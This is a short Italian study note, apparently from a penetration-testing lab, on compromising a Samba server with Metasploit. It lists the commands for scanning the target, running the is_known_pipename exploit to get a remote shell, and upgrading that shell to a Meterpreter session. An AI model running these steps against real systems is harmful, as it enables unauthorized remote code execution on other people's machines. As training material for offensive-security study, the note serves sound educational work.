# Exploiting Samba

<figure><img src="../../../.gitbook/assets/image (1122).png" alt=""><figcaption></figcaption></figure>

Shared library è l'equivalente Linux di una dll in Windows.

## Preparazione ambiente

```
service postgresql start
msfconsole
workspace -a samba
setg RHOSTS 192.18.76.3
```

<figure><img src="../../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```
db_nmap -sS -sV -O 192.18.76.3
search type:exploit name:samba
```

<figure><img src="../../../.gitbook/assets/image (1124).png" alt=""><figcaption></figcaption></figure>

Vediamo che Samba è attivo ma non ci fornisce una versione precisa, solo una stima che è tra una versione 3.X e una 4.X

<figure><img src="../../../.gitbook/assets/image (1125).png" alt=""><figcaption></figcaption></figure>

## Exploit

```
use exploit/linux/samba/is_known_pipename
show options
check //controlliamo se il target è vulnerabile e se c'è una share writable
info //per controllare che l'exploit sia compatible con la versione di samba del target
run
ls
pwd
```

<figure><img src="../../../.gitbook/assets/image (1126).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1128).png" alt=""><figcaption></figcaption></figure>

### Upgrade da command shell a meterpreter

```
CTRL+Z
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST eth1
set SESSION 1
run
sessions
sessions 2
sysinfo
getuid
```

<figure><img src="../../../.gitbook/assets/image (1129).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1130).png" alt=""><figcaption></figcaption></figure>
